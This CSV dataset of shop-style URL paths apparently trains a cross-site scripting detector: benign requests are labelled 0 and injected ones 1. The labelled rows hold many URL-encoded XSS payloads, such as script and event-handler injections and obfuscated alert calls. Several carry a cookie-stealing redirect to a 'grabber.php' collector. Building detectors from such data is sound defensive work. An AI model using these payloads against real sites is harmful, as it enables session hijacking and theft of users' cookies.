text,label
/products?electronics=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?value1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/cart?action=update&item=notebook,0
/search?q=apple,0
/products?password123=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?apple=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=monitor&quantity=39&category=stationery&color=white,0
/products?category=furniture&page=9&color=black,0
/cart?action=remove&item=apple&color=black&size=large,0
/cart?action=remove&item=shirt&size=medium,0
/cart?action=remove&item=tablet,0
/checkout?total=986&currency=USD,0
/user/profile?id=2464&view=summary,0
/api/items?id=252&details=true&color=blue,0
/search?book=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?password123=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?q=chair,0
/products?category=groceries&page=10,0
/checkout?total=692&currency=USD,0
/search?q=notebook,0
/search?query=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/user/profile?id=2223&view=summary&color=red,0
/user/profile?id=3280&view=summary&color=green,0
/products?laptop=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?laptop=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?category=clothing&page=2&color=yellow,0
/wishlist?banana=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=electronics&page=1&color=blue&size=small,0
/cart?action=add&item=tablet&color=black,0
/order?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/login?query=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/login?laptop=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?search_term=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=apple&quantity=75&category=furniture,0
/user/profile?id=8659&view=summary,0
/api?electronics=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=apple&action=add&color=yellow,0
/checkout?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?action1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=7872&view=summary&color=black,0
/cart?action=remove&item=notebook,0
/order?item=notebook&quantity=88&category=groceries,0
/products?value1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/api?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=phone&color=red,0
/checkout?total=947&currency=USD,0
/wishlist?book=%3Csvg%20onload%3Dalert%281%29%3E,1
/search?q=stationery&color=yellow,0
/checkout?category1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=860&details=true,0
/api/items?id=128&details=true,0
/api/items?id=189&details=true,0
/checkout?total=857&currency=USD,0
/cart?category1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/login?search_term=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?q=groceries,0
/cart?username1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/user/profile?id=3978&view=summary,0
/api/items?id=921&details=true,0
/login?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/search?q=pen,0
/wishlist?item=pen&action=remove,0
/products?shoes=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?item=notebook&action=add&size=large,0
/user/profile?id=8910&view=summary&color=red,0
/api/items?id=123&details=true,0
/order?item=monitor&quantity=29&category=groceries&color=blue,0
/checkout?total=382&currency=USD&size=small,0
/checkout?total=395&currency=USD&color=red,0
/cart?username1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/cart?action=update&item=pen,0
/cart?action=add&item=monitor,0
/wishlist?category1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/login?shoes=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?banana=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api/items?id=941&details=true&color=green,0
/checkout?total=173&currency=USD&color=green&size=small,0
/products?book=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?password123=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?category1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?username1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?action=add&item=tablet,0
/cart?action=remove&item=tablet&size=large,0
/cart?action=add&item=tablet&color=black,0
/checkout?total=749&currency=USD,0
/products?banana=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?laptop=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api?value1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api/items?id=841&details=true,0
/search?value1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=261&details=true&color=black,0
/search?apple=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=9737&view=summary,0
/search?q=electronics,0
/wishlist?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?q=notebook&color=yellow,0
/user/profile?id=2646&view=summary,0
/cart?action=update&item=shirt&color=red,0
/products?banana=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/search?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=clothing&page=4,0
/order?item=chair&quantity=10,0
/order?item=notebook&quantity=15,0
/order?item=book&quantity=80&color=red,0
/products?banana=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?action=remove&item=phone,0
/checkout?total=116&currency=USD&color=black&size=medium,0
/search?shoes=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?laptop=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=notebook&color=yellow,0
/products?category=groceries&page=6&color=black,0
/checkout?password123=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?total=985&currency=USD,0
/order?item=chair&quantity=26&category=groceries&size=small,0
/products?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?banana=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/products?phone=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=groceries&color=blue,0
/checkout?value1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=4747&view=summary&color=green,0
/checkout?password123=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=489&details=true,0
/checkout?query=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?category=electronics&page=7,0
/products?category=furniture&page=3,0
/checkout?book=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?book=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=bottle&action=remove,0
/order?item=shirt&quantity=95&category=clothing&color=red,0
/products?category1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?item=chair&quantity=15&category=groceries,0
/wishlist?item=monitor&action=add&color=green&size=small,0
/user/profile?id=2684&view=summary,0
/wishlist?item=tablet&action=remove&color=white,0
/wishlist?item=apple&action=add,0
/order?action1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/search?category1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?total=69&currency=USD&color=black,0
/login?category1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/api?shoes=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=view&item=monitor&color=black&size=small,0
/search?q=apple&size=large,0
/wishlist?item=shirt&action=remove,0
/api?phone=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?item=monitor&action=add,0
/login?category1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api/items?id=883&details=true,0
/login?banana=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/login?search_term=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/products?phone=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?search_term=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?shoes=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=pen&action=remove,0
/wishlist?apple=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?electronics=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/login?password123=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?shoes=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?q=monitor&color=red,0
/cart?username1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=bottle&quantity=47&category=electronics,0
/cart?action=remove&item=chair&size=small,0
/checkout?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?shoes=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?action=remove&item=phone,0
/login?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/login?electronics=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?q=apple&size=small,0
/checkout?laptop=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/login?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?item=monitor&quantity=9,0
/products?action1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?item=pen&action=add,0
/search?q=clothing,0
/api?phone=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?banana=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?category=electronics&page=8,0
/login?value1=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?phone=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?q=monitor,0
/api?apple=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?action=remove&item=phone,0
/cart?action1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/search?q=groceries,0
/user/profile?id=2766&view=summary,0
/search?book=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?search_term=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?action=view&item=monitor,0
/cart?password123=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?shoes=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=tablet&action=add&color=blue,0
/products?category1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/user/profile?id=9254&view=summary&color=red,0
/checkout?electronics=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?action=view&item=apple,0
/products?password123=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?electronics=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?username1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/user/profile?id=3452&view=summary&color=yellow&size=small,0
/cart?action=view&item=monitor&color=green,0
/user/profile?id=5126&view=summary,0
/user/profile?id=9236&view=summary&size=small,0
/wishlist?banana=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?value1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=268&details=true,0
/cart?laptop=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?category=clothing&page=7,0
/user/profile?id=7791&view=summary&color=black,0
/wishlist?item=chair&action=remove,0
/user/profile?id=2314&view=summary,0
/api/items?id=889&details=true,0
/products?book=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/api/items?id=175&details=true&size=large,0
/user/profile?id=7665&view=summary&color=yellow,0
/user/profile?id=1343&view=summary&color=white,0
/order?item=apple&quantity=78&category=electronics&color=white,0
/api/items?id=246&details=true&color=blue,0
/cart?action1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?total=760&currency=USD&color=green&size=medium,0
/wishlist?item=shirt&action=remove,0
/search?shoes=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=electronics&page=10&color=black,0
/wishlist?book=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=706&details=true,0
/wishlist?username1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=8296&view=summary,0
/order?item=tablet&quantity=67&category=stationery&size=small,0
/api/items?id=640&details=true,0
/checkout?total=520&currency=USD&color=red,0
/products?category=clothing&page=10&color=green,0
/cart?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?category1=%3Csvg%20onload%3Dalert%281%29%3E,1
/login?action1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api/items?id=106&details=true&color=white,0
/order?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/user/profile?id=5096&view=summary,0
/cart?action=update&item=monitor&color=white,0
/products?category=groceries&page=7,0
/products?category1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/search?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/user/profile?id=6961&view=summary&color=white,0
/cart?action=remove&item=pen,0
/login?category1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=tablet,0
/search?q=shirt&size=large,0
/checkout?apple=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=add&item=notebook,0
/api/items?id=909&details=true,0
/checkout?laptop=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?item=book&action=remove,0
/products?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?shoes=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?search_term=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=view&item=book,0
/order?password123=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?password123=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?total=324&currency=USD&color=blue&size=small,0
/api?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=clothing&color=green,0
/search?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?value1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?total=141&currency=USD,0
/search?electronics=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?item=phone&quantity=9&category=furniture,0
/order?item=tablet&quantity=16,0
/search?banana=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?category1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/login?password123=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/search?apple=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?item=chair&quantity=72,0
/login?category1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/api?value1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?banana=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?banana=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?shoes=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api/items?id=202&details=true&color=yellow&size=small,0
/search?q=stationery,0
/search?q=groceries,0
/api?value1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/user/profile?id=5385&view=summary&color=white,0
/products?category=groceries&page=7&color=white,0
/order?password123=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/login?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=146&details=true&size=medium,0
/user/profile?id=1760&view=summary&size=small,0
/checkout?password123=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?item=shirt&quantity=58&color=white&size=medium,0
/login?electronics=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=689&details=true&size=medium,0
/user/profile?id=5084&view=summary&size=small,0
/search?query=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/search?laptop=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?banana=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?username1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=tablet&quantity=50&category=stationery&color=blue&size=medium,0
/order?username1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=monitor&action=remove&color=black,0
/products?category=groceries&page=10,0
/api?electronics=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/login?username1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?total=824&currency=USD,0
/order?book=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=bottle&quantity=72&category=stationery&color=green,0
/api/items?id=916&details=true,0
/cart?banana=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=electronics&page=10,0
/checkout?total=785&currency=USD,0
/order?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?shoes=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api?banana=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=update&item=apple,0
/search?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?laptop=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?item=pen&action=remove,0
/products?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/products?category=clothing&page=3,0
/wishlist?action1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?laptop=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?query=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?action=remove&item=shirt&color=yellow,0
/login?category1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=stationery&page=4&color=green,0
/api?query=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=add&item=chair,0
/api?laptop=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/login?password123=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/products?category1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?laptop=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?total=142&currency=USD,0
/order?phone=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api/items?id=507&details=true,0
/wishlist?item=tablet&action=add,0
/cart?phone=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?laptop=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?action=remove&item=monitor,0
/api?phone=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/api/items?id=872&details=true,0
/cart?query=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?total=345&currency=USD,0
/search?q=notebook,0
/wishlist?item=tablet&action=remove,0
/products?category=furniture&page=9,0
/checkout?action1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?action=remove&item=notebook&color=yellow,0
/search?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/search?q=furniture,0
/user/profile?id=1959&view=summary&color=yellow,0
/api?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/login?book=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?username1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/products?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/user/profile?id=6064&view=summary,0
/user/profile?id=1496&view=summary,0
/order?item=shirt&quantity=32&category=furniture&color=blue,0
/api/items?id=808&details=true&size=large,0
/user/profile?id=4158&view=summary&size=small,0
/order?action1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/products?value1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?item=shirt&quantity=72&color=white&size=medium,0
/search?book=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?item=phone&quantity=71&category=electronics&color=yellow,0
/checkout?total=106&currency=USD,0
/login?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/products?category=groceries&page=7&color=black,0
/wishlist?item=shirt&action=remove&size=large,0
/cart?book=%3Csvg%20onload%3Dalert%281%29%3E,1
/products?category=furniture&page=7&color=white,0
/products?category=electronics&page=5&color=red,0
/products?category=groceries&page=4&size=small,0
/wishlist?item=phone&action=add&size=large,0
/search?username1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=monitor&action=add,0
/order?shoes=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/login?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=phone&quantity=19&category=groceries,0
/order?item=apple&quantity=29&size=large,0
/order?item=chair&quantity=24&category=furniture,0
/checkout?banana=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/search?action1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?item=bottle&quantity=87,0
/wishlist?item=notebook&action=add&size=large,0
/login?book=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?apple=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?total=328&currency=USD,0
/api?action1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?value1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=notebook&action=add,0
/checkout?total=929&currency=USD&color=yellow&size=medium,0
/wishlist?item=notebook&action=remove,0
/user/profile?id=4997&view=summary&color=green&size=medium,0
/search?search_term=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?action=view&item=pen&color=red&size=large,0
/wishlist?item=chair&action=add&color=black,0
/order?search_term=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?username1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=update&item=phone,0
